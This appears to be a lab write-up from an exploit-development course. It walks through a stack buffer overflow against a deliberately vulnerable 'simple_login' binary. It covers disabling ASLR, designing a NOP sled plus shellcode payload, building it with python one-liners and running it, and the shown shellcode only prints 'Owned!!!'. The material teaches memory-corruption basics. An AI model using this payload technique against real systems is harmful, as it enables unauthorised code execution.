### Info
In this lab, we'll inject and run the shellcode we created in lab3 to the vulnerable simple_login program in lab1 and trigger its execution.<br/><br/>
**Environment**: Ubuntu 18.04.3 LTS<br>
**Keywords**: buffer, overflow, shellcode, exploit, nop, nopsled, payload

### Implementation
There are two prerequisites to make it work
- ASLR must be disabled. ASLR is a security technique that makes it hard to predict target addresses for exploits.Basically, in every run
of an executable, OS generates different address layouts for stack, and shared libraries. You'll see later in lab why we need to disable it.
It's disabled as the following:
`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`. 
- Stack must be executable as also shown in lab4.
In lab1 where we manipulated return address, the payload was 80 bytes containing 76 bytes of junk data + 4 bytes of the return address we intended. For this lab, we'll prepare a payload which with a very different content.

#### How to layout the payload
We need to remember the stack layout of `authorize` function.
![](../lab1_simple_login_analysis/image.png)

As it can be seen, we have 76 bytes space that we can place shellcode. So, how many bytes our shellcode have? -> 28 as below.
```
uzi@pwnpatrol:$ wc -c ../lab3_converting_lab2_to_shellcode/hello_shellcode
28 ../lab3_converting_lab2_to_shellcode/hello_shellcode
```
Our goal is to create a payload, such that:
* It'll include the shellcode to be executed.
* It must replace the return address of `authorize` function with the address of shellcode. So that when the authorize function is to return, it'll execute our shellcode.

We have some ideas listed below.(the numbers inside parenthesis indicate number of bytes):
##### Idea 1
Put the shellcode to the beginning, fill the remaining bytes with junkdata like 'A's, and reserving last 4 bytes for address of shellcode.
```
 __________________ __________________ __________________
|                  |                  |    shellcode     |
|  shellcode(28)   |  junkdata(48)    |    address(4)    |
|__________________|__________________|__________________|
```
Well, this may work, but...Even with ASLR disabled, the address of password buffer (to be used as shellcode address)  is very volatile. Why? Let me show with examples:
* Use ltrace to see the address of password buffer and do it twice.
```
uzi@pwnpatrol:$ ltrace ./simple_login 
__libc_start_main(0x80485cf, 1, 0xffffd5e4, 0x8048610 <unfinished ...>
printf("Enter Password: ")
gets(0xffffd4e0, 0xc10000, 0, 0xf7ffd000Enter Password: )
...

uzi@pwnpatrol:$ ltrace ./simple_login 
__libc_start_main(0x80485cf, 1, 0xffffd5e4, 0x8048610 <unfinished ...>
printf("Enter Password: ")
gets(0xffffd4e0, 0xc10000, 0, 0xf7ffd000Enter Password: )
```
* As seen above, the address of password buffer (first parameter of gets) is **0xffffd4e0** in both attempts. Now create a `temp_folder`, cd inside and run the binary again with ltrace. Observe that the address is now 0xffffd4b0. What's the reason?
```
uzi@pwnpatrol:$ cd temp_folder/
uzi@pwnpatrol:$ ltrace ./simple_login 
__libc_start_main(0x80485cf, 1, 0xffffd5b4, 0x8048610 <unfinished ...>
printf("Enter Password: ")
gets(0xffffd4b0, 0xc10000, 0, 0xf7ffd000Enter Password: 
```
* If you check the deep stack, you'll see environment variables, program arguments, path of executable. So if the path of executable changes, stack will be different, affecting the address of local variables. Even you run the executable twice in same path, once with and once without gdb, you'll see that the variable address will be different since gdb adds some more environment variables before running and also argv[0] will be full path with gdb. Without gdb argv[0] will be just "simple_login".
```
0xffffd73a:     "/home/uzi/exploit_labs/lab5_injecting_shellcode/simple_login"
0xffffd777:     "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01"
0xffffdd95:     "LESSCLOSE=/usr/bin/lesspipe %s %s"
0xffffddb7:     "_=/usr/bin/gdb"
0xffffddc6:     "LANG=C.UTF-8"
0xffffddd3:     "XDG_SESSION_ID=1"
0xffffdde4:     "USER=uzi"
0xffffdded:     "PWD=/home/uzi/exploit_labs/lab5_injecting_shellcode"
0xffffde21:     "LINES=71"
0xffffde2a:     "HOME=/home/uzi"
0xffffde5b:     "XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop"
0xffffde9c:     "SSH_TTY=/dev/pts/0"
0xffffdeaf:     "COLUMNS=263"
0xffffdebb:     "MAIL=/var/mail/uzi"
0xffffdece:     "SHELL=/bin/bash"
0xffffdede:     "TERM=xterm-256color"
0xffffdef2:     "SHLVL=1"
0xffffdefa:     "LOGNAME=uzi"
0xffffdf06:     "XDG_RUNTIME_DIR=/run/user/1001"
0xffffdf25:     "PATH=/home/uzi/bin:/usr/local/sbin:/usr/local/bin"
```
* As a result idea 1 is not a good idea. We can't use exact address of password buffer in last 4 bytes. Because in the target, this address may point to a location before or after the intended one.

##### Idea 2
Put the junkdata to the beginning, fill the remaining bytes with shellcode, and reserving last 4 bytes for an address in the middle of junkdata. But what happens if CPU tries to execute instructions in junk data. It'll fail. 
```
 __________________ __________________ __________________
|                  |                  |    shellcode     |
|   junkdata(48)   |  shellcode(28)   |    address(4)    |
|__________________|__________________|__________________|
```

##### Idea 3
We'll put so called nopsled instead of junk data. A nopsled is sequence of no-op (0x90) instructions. If $eip hits to somewhere in this nopsled, it'll execute no-op instructions one by one till it comes to shellcode. So this is what're looking for. Really? 
```
 __________________ __________________ __________________
|                  |                  |    shellcode     |
|    nopsled(44)   |  shellcode(28)   |    address(4)    |
|__________________|__________________|__________________|
```
Actually not. As shown below, our shellcode pushes 8 bytes to stack. Also notice that $esp will be pointing the location just after the last 4 byte of payload in memory (since ret instruction is called while $esp pointing to last 4 bytes. When ret is called it pops the return address). So the first push will override the last 4 byte in payload in memory. That's not important as we are already in execution of shellcode. However the second push will corrupt the last 4 bytes of shellcode. Therefore we need to improve.
```
uzi@pwnpatrol:$ objdump -Mintel -mi386 -b binary -D ../lab3_converting_lab2_to_shellcode/hello_shellcode
...
   c:   68 64 21 21 21          push   0x21212164
  11:   68 4f 77 6e 65          push   0x656e774f
  16:   89 e1                   mov    ecx,esp
  18:   b2 08                   mov    dl,0x8
  1a:   cd 80                   int    0x80
```

##### Idea 4
We allocate 4 bytes junk data after shellcode and before shellcode address to be used for second push. So, no corruption should occur.
```
 __________________ __________________ ______________ __________________
|                  |                  |              |    shellcode     |
|    nopsled(44)   |  shellcode(28)   |   junk(4)    |    address(4)    |
|__________________|__________________|______________|__________________|
        ^^
```
Shellcode address should point to the middle of nopsled for flexibility as discussed above. So we add half of 44 to the beginning of address.
```
>>> hex(0xffffd4e0+(44/2))
'0xffffd4f6
```
#### Creating the payload
We'll create the payload one by one. As junk data we use four "A"s before the address.
```
python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*44)' > payload
cat ../lab3_converting_lab2_to_shellcode/hello_shellcode >> payload
python3 -c 'import sys;sys.stdout.buffer.write(b"AAAA\xf6\xd4\xff\xff")' >> payload
```
The final payload should like this
```
00000000: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
00000010: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
00000020: 90 90 90 90 90 90 90 90 90 90 90 90 31 c0 31 db  ............1.1.
00000030: 31 c9 31 d2 b0 04 b3 01 68 64 21 21 21 68 4f 77  1.1.....hd!!!hOw
00000040: 6e 65 89 e1 b2 08 cd 80 41 41 41 41 f6 d4 ff ff  ne......AAAA....
```
#### Execution
Provide the payload into the stdin. The segmentation fault is expected since, CPU tries to execute junk data after shellcode. We could have put exit syscall in the shellcode for a safer exit, but it's not needed as we tried to keep shellcode simple.
```
uzi@pwnpatrol:$ ./simple_login < payload
Owned!!!Segmentation fault (core dumped)
```
